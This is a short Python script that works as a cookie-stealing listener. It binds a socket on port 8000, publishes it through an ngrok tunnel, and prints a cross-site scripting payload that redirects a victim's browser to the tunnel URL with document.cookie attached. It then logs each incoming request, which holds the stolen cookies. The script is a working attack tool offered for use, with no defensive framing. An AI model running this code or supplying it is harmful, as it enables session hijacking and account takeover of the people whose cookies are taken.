from os import system
import socket
from colorama import Fore
import sys
import time

host='localhost'
port=8000
buffer=3000

def ngrok():
	system('killall -2 ngrok > /dev/null')
	system('./ngrok http {} > /dev/null &'.format(8000))
	time.sleep(7)
	system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link.url')
	urlFile = open('link.url', 'r')
	url = urlFile.read()
	print ()
	print ()
	print ('URL : {}'.format(url))
	print ()
	print ("URL : document.location='{}/view/image.png?c='+document.cookie;".format(url))
	urlFile.close()


server=socket.socket()
server.bind((host,port))

server.listen()

#--------------------------------------------------
print (Fore.GREEN)
print (f'[*] Listening on Port:{port}')
print ('STATUS: RUNNING')
ngrok()
print (Fore.YELLOW)
print ('_'*45)

while True:
	try:
		client_socket,address =  server.accept()
		print ()
		print ()
		print (Fore.GREEN)
		print (f'[+] A client is connected')
		print ()
		print ()
		print (Fore.RED)
		data = client_socket.recv(buffer).decode()
		print(data)
		client_socket.close()
		print (Fore.YELLOW)
		print ('_'*45)
	except KeyboardInterrupt:
		server.close()
		print (Fore.YELLOW+'[-] Stopping server')
		sys.exit()
